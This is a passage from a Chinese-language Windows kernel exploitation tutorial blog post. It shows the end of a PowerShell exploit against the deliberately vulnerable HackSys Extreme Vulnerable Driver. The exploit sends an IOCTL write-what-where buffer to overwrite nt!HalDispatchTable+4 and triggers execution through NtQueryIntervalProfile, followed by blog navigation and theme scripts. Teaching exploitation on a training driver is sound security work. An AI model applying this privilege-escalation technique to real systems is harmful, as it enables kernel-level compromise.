Get handle to driver</span></span><br><span class="line"><span class="variable">$hDevice</span> = [EVD]::CreateFile(<span class="string">"\\.\HacksysExtremeVulnerableDriver"</span>, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, <span class="number">0</span>x3, <span class="number">0</span>x40000080, [System.IntPtr]::Zero)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$hDevice</span> <span class="nomarkup">-eq</span> -<span class="number">1</span>) &#123;</span><br><span class="line">    echo <span class="string">"`n[!] Unable to get driver handle..`n"</span></span><br><span class="line">    <span class="keyword">Return</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">"`n[&gt;] Driver information.."</span></span><br><span class="line">    echo <span class="string">"[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"</span></span><br><span class="line">    echo <span class="string">"[+] Handle: <span class="variable">$hDevice</span>"</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># TriggerArbitraryOverwrite() IOCTL = 0x22200B</span></span><br><span class="line"><span class="comment"># =&gt; [IntPtr]$WriteWhatPtr-&gt;$WriteWhat + $WriteWhere</span></span><br><span class="line"><span class="comment">#---</span></span><br><span class="line">[IntPtr]<span class="variable">$WriteWhatPtr</span> = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(<span class="variable">$WriteWhat</span>.Length)</span><br><span class="line">[System.Runtime.InteropServices.Marshal]::Copy(<span class="variable">$WriteWhat</span>, <span class="number">0</span>, <span class="variable">$WriteWhatPtr</span>, <span class="variable">$WriteWhat</span>.Length)</span><br><span class="line"><span class="variable">$Buffer</span> = [System.BitConverter]::GetBytes(<span class="variable">$WriteWhatPtr</span>.ToInt32()) + <span class="variable">$WriteWhere</span></span><br><span class="line"> </span><br><span class="line">echo <span class="string">"`n[&gt;] Sending WriteWhatWhere buffer.."</span></span><br><span class="line">echo <span class="string">"[+] IOCTL: 0x22200B"</span></span><br><span class="line">echo <span class="string">"[+] Buffer length: $(<span class="variable">$Buffer</span>.Length)"</span></span><br><span class="line">echo <span class="string">"[+] WriteWhere: 0x$('&#123;0:X&#125;' -f $(<span class="variable">$HalDispatchTable</span>+4)) =&gt; nt!HalDispatchTable+4`n"</span></span><br><span class="line">[EVD]::DeviceIoControl(<span class="variable">$hDevice</span>, <span class="number">0</span>x22200B, <span class="variable">$Buffer</span>, <span class="variable">$Buffer</span>.Length, <span class="literal">$null</span>, <span class="number">0</span>, [ref]<span class="number">0</span>, [System.IntPtr]::Zero) |<span class="built_in">Out-null</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># NtQueryIntervalProfile()-&gt;KeQueryIntervalProfile()</span></span><br><span class="line"><span class="comment"># =&gt; KeQueryIntervalProfile+0x23-&gt; call dword HalDispatchTable+0x4</span></span><br><span class="line"><span class="comment">#---</span></span><br><span class="line"><span class="comment"># kd&gt; </span></span><br><span class="line"><span class="comment"># nt!KeQueryIntervalProfile+0x23:</span></span><br><span class="line"><span class="comment"># 82cd0836 ff150404b382    call    dword ptr [nt!HalDispatchTable+0x4 (82b30404)]</span></span><br><span class="line"><span class="comment"># 82cd083c 85c0            test    eax,eax</span></span><br><span class="line"><span class="comment"># 82cd083e 7c0b            jl      nt!KeQueryIntervalProfile+0x38 (82cd084b)</span></span><br><span class="line"><span class="comment">#---</span></span><br><span class="line">echo <span class="string">"[&gt;] Calling NtQueryIntervalProfile trigger..`n"</span></span><br><span class="line">[UInt32]<span class="variable">$Dummy</span> = <span class="number">0</span></span><br><span class="line">[EVD]::NtQueryIntervalProfile(<span class="number">0</span>xb33f,[ref]<span class="variable">$Dummy</span>) |<span class="built_in">Out-Null</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/exploit/fuzzySecurity/20180201_7.jpg" alt=""></p>
+<p>同样的，思考一下，在污染了HalDispatchTable指针后，我们有效的创建了一个内核之门。我们总是可以在同样的偏移处覆盖我们的shellcode并通过调用NtQueryIntervalProfile来直接运行内核中我们的新代码。</p>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/02/01/内核利用程序之任意位置任意写/">Windows exploit系列教程第十一部分：内核利用程序之任意位置任意写</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 r00tk1t 的个人博客">r00tk1t</a></p>
+        <p><span>发布时间:</span>2018年02月01日 - 23时49分</p>
+        <p><span>最后更新:</span>2020年10月20日 - 21时01分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/02/01/内核利用程序之任意位置任意写/" title="Windows exploit系列教程第十一部分：内核利用程序之任意位置任意写">https://r00tk1ts.github.io/2018/02/01/内核利用程序之任意位置任意写/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://r00tk1ts.github.io/2018/02/01/内核利用程序之任意位置任意写/　　作者: r00tk1t" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2018/02/06/内核利用程序之空指针引用/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Windows exploit系列教程第十二部分：内核利用程序之空指针引用
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/01/15/ring0层exp原语之滥用GDI/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ring0层exp原语之滥用GDI</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#内核利用程序之任意位置任意写"><span class="toc-number">1.</span> <span class="toc-text">内核利用程序之任意位置任意写</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#侦查挑战"><span class="toc-number">1.1.</span> <span class="toc-text">侦查挑战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.2.</span> <span class="toc-text">Pwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#终结"><span class="toc-number">1.3.</span> <span class="toc-text">终结</span></a></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2018/02/06/内核利用程序之空指针引用/" title="上一篇: Windows exploit系列教程第十二部分：内核利用程序之空指针引用">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2018/01/15/ring0层exp原语之滥用GDI/" title="下一篇: ring0层exp原语之滥用GDI">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/10/22/chromium-base库源码解读之引用计数拆解篇/">chromium-base库源码解读之引用计数拆解篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/16/深入探索禁忌目录之Effective C++篇/">深入探索禁忌目录之Effective C++篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/10/C++ Primer - 特殊工具与技术/">C++ Primer - 特殊工具与技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/08/C++ Primer - 用于大型程序的工具/">C++ Primer - 用于大型程序的工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/06/C++ Primer - 标准库特殊设施/">C++ Primer - 标准库特殊设施</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/03/C++ Primer - 模板与泛型编程/">C++ Primer - 模板与泛型编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/01/C++ Primer - 面向对象程序设计/">C++ Primer - 面向对象程序设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/29/C++ Primer - 重载运算与类型转换/">C++ Primer - 重载运算与类型转换</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/29/C++ Primer - 拷贝控制/">C++ Primer - 拷贝控制</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/26/C++ Primer - 动态内存/">C++ Primer - 动态内存</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/26/C++ Primer - 关联容器/">C++ Primer - 关联容器</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/24/C++ Primer - 泛型算法/">C++ Primer - 泛型算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/24/C++ Primer - 顺序容器/">C++ Primer - 顺序容器</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/21/C++ Primer - IO库/">C++ Primer - IO库</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/21/C++ Primer - 类/">C++ Primer - 类</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/20/C++ Primer - 函数/">C++ Primer - 函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/20/C++ Primer - 语句/">C++ Primer -语句</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/20/C++ Primer - 表达/">C++ Primer - 表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/28/C++ Primer - string, vector & array/">C++ Primer - string, vector, array</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/28/C++ Primer - 变量和基本类型/">C++ Primer - 变量和基本类型</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/25/C++ Templates Note - 类模板/">C++ Templates Note - 类模板</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/25/C++ Templates Note - 函数模板/">C++ Templates Note- 函数模板</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/13/Linux内存管理-进程地址空间/">Linux内核学习——内存管理之进程地址空间</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/07/一次失败的栈溢出(SEH)之GetGo Download Manager/">一次失败的栈溢出(SEH)之GetGo Download Manager</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/28/DNSTracer 1.9栈溢出漏洞[CVE-2017-9430]/">DNSTracer 1.9栈溢出漏洞[CVE-2017-9430]</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/24/A Tale of Exploit Easy RM 2 MP3 Converter/">A Tale of Exploit "Easy RM 2 MP3</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/chromium-sandbox-ThreadProcess-analysis/">Chromium-sandbox-ThreadProcess-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/chromium-sandbox-Filesystem-analysis/">Chromium-sandbox-Filesystem-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/chromium-sandbox-LowLevelPolicy-analysis/">Chromium-sandbox-LowLevelPolicy-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/26/chromium-sandbox-PolicyEngine-analysis/">Chromium-sandbox-PolicyEngine-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/26/chromium-sandbox-Resolver-analysis/">Chromium-sandbox-Resolver-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/26/chromium-sandbox-Interception/">Chromium-sandbox-Interception-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/21/chromium-sandbox-HandleCloser-analysis/">Chromium-sandbox-HandleCloser-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/20/chromium-sandbox-SharedMemIPC/">Chromium-sandbox-SharedMemIPC-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/19/chromium-sandbox-Crosscall-analysis/">Chromium-sandbox-crosscall-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/19/chromium-sandbox-AlternateDesktop-analysis/">Chromium-sandbox-AlternateDesktop-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/19/chromium-sandbox-Tokens-analysis/">Chromium-sandbox-Tokens-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/14/chromium-sandbox-Job-analysis/">Chromium-sandbox-Job-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/chromium-sandbox-TargetPolicy-analysis/">Chromium-sandbox-TargetPolicy-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/chromium-sandbox-TargetProcess-analysis/">Chromium-sandbox-TargetProcess-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/chromium-sandbox-TargetServices-analysis/">Chromium-sandbox-TargetServices-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/chromium-sandbox-BrokerServices/">Chromium-sandbox-BrokerServices-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/05/x41-浏览器安全白皮书笔记/">X41-浏览器安全白皮书读书笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/22/Windows系统机制之同步/">Windows系统机制之同步</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/21/Windows系统机制之对象管理器/">Windows系统机制之对象管理器</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/21/Windows系统机制之陷阱分发/">Windows系统机制之陷阱分发</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/21/Bitmaps轶事：Windows 10纪念版前的GDI对象泄露/">Bitmap轶事：Windows 10纪念版后的GDI对象泄露</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/理解池污染三部曲/">理解池污染三部曲</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/内核利用程序之Razer rzpnk.sys中的逻辑bug/">Windows exploit系列教程第十九篇：内核利用程序之Razer rzpnk.sys中的逻辑bug</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/内核利用程序之RS2 Bitmap巫术/">Windows exploit系列教程第十八篇：内核利用程序之RS2 Bitmap巫术</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/15/内核利用程序之滥用GDI Bitmap/">Windows exploit系列教程第十七部分：内核利用程序之任意位置任意写</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/14/内核利用程序之池溢出/">Windows exploit系列教程第十六部分：内核利用程序之池溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/14/内核利用程序之UAF/">Windows exploit系列教程第十五部分：内核利用程序之UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/10/coin1/">Writeup.pwnable.kr系列之coin1</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/10/shellshock/">Writeup.pwnable.kr系列之shellshock</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/09/mistake/">Writeup.pwnable.kr系列之mistake</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/07/leg/">Writeup.pwnable.kr系列之leg</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/input/">Writeup.pwnable.kr系列之input</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/05/random/">Writeup.pwnable.kr系列之random</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/05/passcode/">Writeup.pwnable.kr系列之passcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/04/flag/">Writeup.pwnable.kr系列之flag</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/04/bof/">Writeup.pwnable.kr系列之bof</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/collision/">Writeup.pwnable.kr系列之collision</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/fd/">Writeup.pwnable.kr系列之fd</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/Binary Security Assembly/">Binary-Security-Assembly</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/07/内核利用程序之整数溢出/">Windows exploit系列教程第十四部分：内核利用程序之整数溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/06/内核利用程序之未初始化栈变量/">Windows exploit系列教程第十三部分：内核利用程序之未初始化栈变量</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/06/内核利用程序之空指针引用/">Windows exploit系列教程第十二部分：内核利用程序之空指针引用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/01/内核利用程序之任意位置任意写/">Windows exploit系列教程第十一部分：内核利用程序之任意位置任意写</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/ring0层exp原语之滥用GDI/">ring0层exp原语之滥用GDI</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/14/Windows x64内核提权/">Windows x64内核提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/14/关键的Windows内核数据结构一览（下）/">关键的Windows内核数据结构一览（下）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/08/关键的Windows内核数据结构一览（上）/">关键的Windows内核数据结构一览（上）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/06/内核利用程序开发之栈溢出/">Windows exploit系列教程第十部分：内核利用程序之栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/05/堆喷射[第二章：UAF]/">Windows exploit系列教程第九部分：堆喷射[第二章：UAF]</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/30/Kernel Driver mmap Handler Exploitation/">内核驱动mmap Handler利用技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/28/API Interception via DLL Redirection/">通过DLL重定向实现API劫持</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/Linux中断内幕/">Linux中断内幕</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/19/Windows架构设计/">Windows架构设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/30/house_of_force.log/">house_of_force log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/25/Linux内存管理-非连续内存区管理/">Linux内核学习——内存管理之非连续内存区管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/24/Linux内存管理-内存区管理/">Linux内核学习——内存管理之内存区管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/20/Linux内存管理-页框管理/">Linux内核学习——内存管理之页框管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/first_fit.log/">first_fit log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/house_of_einherjar.log/">house_of_einherjar log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/18/fastbin_dup_into_stack.log/">fastbin_dup_into_stack log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/12/fastbin_dup.log/">fastbin_dup log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/23/Windows栈溢出之ret eip/">Windows栈溢出之ret eip</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/23/Windows栈溢出概述/">Windows栈溢出概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/16/DEFCON-2015-r0pbaby/">DEFCON-2015-r0pbaby</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/11/PWN选手的自我修养/">PWN选手的自我修养</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/27/linearsort/">linear sort</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/27/quicksort/">quicksort</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/27/heapsort&priority-queue/">heapsort & priority-queue</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/27/Linux进程的创建与撤销/">Linux内核学习——Linux进程的创建与撤销</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/26/Linux进程切换/">Linux内核学习——Linux进程切换</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/24/GNU Hash ELF Sections/">GNU Hash ELF Sections</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/22/Linux进程概述/">Linux内核学习——Linux进程概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/18/Linux内存寻址/">Linux内核学习——内存寻址</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/15/PlaySms  1.4代码执行漏洞之import csv/">PlaySms 1.4代码执行漏洞之import csv</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/15/PlaySms  1.4代码执行漏洞分析/">PlaySms 1.4代码执行漏洞分析</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 r00tk1t
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >访问数量: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
